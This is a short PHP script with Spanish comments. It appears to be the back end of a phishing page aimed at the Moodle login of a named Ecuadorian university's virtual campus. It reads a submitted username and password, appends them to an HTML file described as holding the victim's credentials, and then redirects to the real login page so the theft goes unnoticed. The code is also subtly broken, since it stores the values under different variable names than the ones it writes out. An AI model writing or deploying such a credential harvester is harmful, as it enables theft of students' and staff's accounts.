<?
#variable.php
//Asigna el valor de las variables del usuario y contraseña
$usuario=$_POST['username'];
$contraseña=$_POST['password'];

// Asigna el valor a la variable donde se guarda el correo y pass de la victima
$guardame=fopen('claves.html','a+');
fwrite($guardame,
"<br/><b>username:</b>".$username.
"<br/><b>password:</b>".$password." ");
fclose($guardame);

//Redireccione a la web original (moodle)
echo "<meta http-equiv='refresh' content='1;url=https://campusvirtual.ug.edu.ec/login/index.php'>"
?>